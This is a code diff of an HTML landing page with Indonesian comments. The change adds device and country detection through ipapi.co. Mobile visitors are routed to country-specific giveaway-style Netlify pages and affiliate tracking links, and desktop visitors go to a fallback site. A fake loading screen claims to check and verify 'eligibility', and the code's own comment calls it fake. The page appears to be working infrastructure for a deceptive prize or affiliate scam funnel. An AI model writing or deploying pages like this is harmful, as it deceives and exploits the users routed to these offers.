@@ -156,7 +156,7 @@
         <!-- BAGIAN 1: LOADING SCREEN -->
         <div id="loading-screen">
             <div class="spinner"></div>
-            <div class="loading-text" id="loading-text">Checking Eligibility...</div>
+            <div class="loading-text" id="loading-text">Checking Device & Location...</div>
         </div>
 
         <!-- BAGIAN 2: KONTEN UTAMA (Muncul setelah loading) -->
@@ -189,32 +189,99 @@
 
     </div>
 
+    <!-- SCRIPT LOGIKA UTAMA -->
     <script>
-        // --- KONFIGURASI URL ---
-        const targetUrl = "http://laststep-us-now.netlify.app/?s1=bzone"; 
-        // -----------------------
+        // --- 1. KONFIGURASI LINK (DATABASE LINK) ---
+        
+        // Link untuk Desktop / Global Fallback
+        const globalLink = "https://jimin.biz.id/";
 
-        // Logika Tampilan
+        // Link Khusus Mobile berdasarkan Kode Negara (ISO Alpha-2 Code)
+        const mobileLinks = {
+            "US": "https://smrturl.co/a/sa894269b47/576?s1=BZONE",      // Amerika
+            "GB": "https://smrturl.co/a/sa894269b47/13881?s1=BZONE",    // Inggris
+            "DE": "https://smrturl.co/a/sa894269b47/497?s1=BZONE",      // Jerman
+            "PH": "https://ph-tagalog-iph.netlify.app/?s1=BZONE",       // Filipina
+            "ES": "http://sorteo-cerrado-gagner.netlify.app/?s1=BZONE", // Spanyol
+            "PL": "https://polski-rozdanie-st.netlify.app/?s1=BZONE",   // Polandia
+            "FR": "https://jeu-concours-fr.netlify.app/?s1=BZONE",      // Prancis
+            "JP": "http://present-campaign-japan.netlify.app/?s1=BZONE",// Jepang
+            "SA": "http://arabic-all-apge.netlify.app/?s1=BZONE",       // Arab Saudi
+            "ID": "https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=BZONE" // Indonesia
+        };
+
+        // Variable untuk menyimpan link tujuan akhir
+        let finalRedirectUrl = globalLink; 
+
+        // ------------------------------------------
+
+        // --- 2. DETEKSI DEVICE & GEO ---
+        
+        async function determineTargetUrl() {
+            // Cek apakah user menggunakan Mobile (HP/Tablet)
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            if (!isMobile) {
+                // Jika DESKTOP -> Gunakan Link Global
+                console.log("Device: Desktop detected. Using Global Link.");
+                finalRedirectUrl = globalLink;
+                return;
+            }
+
+            // Jika MOBILE -> Cek Lokasi Negara (Geo)
+            console.log("Device: Mobile detected. Fetching Location...");
+            
+            try {
+                // Mengambil data negara via API
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const countryCode = data.country_code; // Contoh hasil: "ID", "US", "DE"
+
+                console.log("User Country: " + countryCode);
+
+                // Cek apakah kode negara ada di daftar mobileLinks kita
+                if (mobileLinks[countryCode]) {
+                    finalRedirectUrl = mobileLinks[countryCode];
+                    console.log("Match found! Redirect set to " + countryCode + " link.");
+                } else {
+                    console.log("Country not in list. Using Global/Fallback link.");
+                    finalRedirectUrl = globalLink; // Atau bisa diganti default mobile link lain
+                }
+
+            } catch (error) {
+                console.error("Gagal mendeteksi lokasi (mungkin adblock atau error jaringan). Menggunakan link default.", error);
+                finalRedirectUrl = globalLink;
+            }
+        }
+
+        // Jalankan fungsi deteksi segera saat halaman dimuat
+        determineTargetUrl();
+
+
+        // --- 3. ANIMASI TAMPILAN ---
+        
         const loadingScreen = document.getElementById('loading-screen');
         const contentScreen = document.getElementById('content-screen');
         const loadingText = document.getElementById('loading-text');
 
-        // Tahap 1: Loading Palsu (3 Detik)
+        // Ganti teks loading di detik ke-1.5 agar terlihat dinamis
         setTimeout(() => {
-            loadingText.innerText = "Verifying..."; // Ganti teks di tengah jalan
+            loadingText.innerText = "Verifying Eligibility..."; 
         }, 1500);
 
+        // Setelah 3 detik, tampilkan konten (saat ini target URL sudah siap)
         setTimeout(() => {
-            // Hilangkan loading, munculkan konten
             loadingScreen.style.display = 'none';
             contentScreen.style.display = 'block';
-        }, 3000); // 3000ms = 3 detik
+        }, 3000); 
 
-        // Fungsi Redirect saat tombol diklik
+
+        // --- 4. FUNGSI KLIK TOMBOL ---
         function goTarget() {
-            // Bisa tambahkan event tracking di sini jika perlu
-            window.location.href = targetUrl;
+            // Redirect user ke link yang sudah ditentukan di atas
+            window.location.href = finalRedirectUrl;
         }
+
     </script>
     
     <center>
